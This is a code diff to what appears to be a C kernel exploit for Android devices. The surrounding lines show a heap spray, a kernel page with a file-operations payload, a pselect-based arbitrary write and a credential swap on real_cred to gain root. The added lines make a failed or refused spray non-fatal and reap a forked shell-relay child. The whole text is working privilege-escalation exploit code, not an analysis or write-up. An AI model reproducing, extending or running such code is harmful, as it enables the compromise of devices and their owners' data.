@@ -1052,7 +1052,14 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   set_pselect_write_mode(target, 0, mode);
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  if (!page_base) {
+    /* A guarded TCL capture refusal is non-fatal: return through
+     * run_cred_swap() so its original-shell relay is stopped and reaped.
+     * pr_error() exits the process immediately and would orphan it. */
+    pr_warning("  heap spray failed or was refused by the capture gate\n");
+    clear_pselect_write();
+    return 0;
+  }
   if (mode == 6 && (!active_offsets ||
       active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
     /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
@@ -3443,6 +3450,24 @@ ghost_battery_done:
       syscall(__NR_exit_group, 99);
       return 0;
     }
+  }
+  /* The original-shell relay is forked before the reclaim.  A fail-closed
+   * capture refusal returns before the success path publishes relay output;
+   * without an explicit stop the child stays in its command loop, becomes an
+   * init-owned orphan and keeps the adb stdout pipe open.  This is userspace
+   * cleanup only: signal the shared exit flag, reap the child, then release
+   * the private shared mapping. */
+  if (relay != MAP_FAILED) {
+    __atomic_thread_fence(__ATOMIC_SEQ_CST);
+    relay->ready = 99;
+    __atomic_thread_fence(__ATOMIC_SEQ_CST);
+    if (relay_child_pid > 0) {
+      int relay_status = 0;
+      while (waitpid(relay_child_pid, &relay_status, 0) < 0 &&
+             errno == EINTR) {}
+      pr_info("TCL relay: fail-path child reaped status=%d\n", relay_status);
+    }
+    munmap(relay, sizeof(*relay));
   }
   pr_error("cred swap failed after %d attempts\n", attempts);
   return 1;
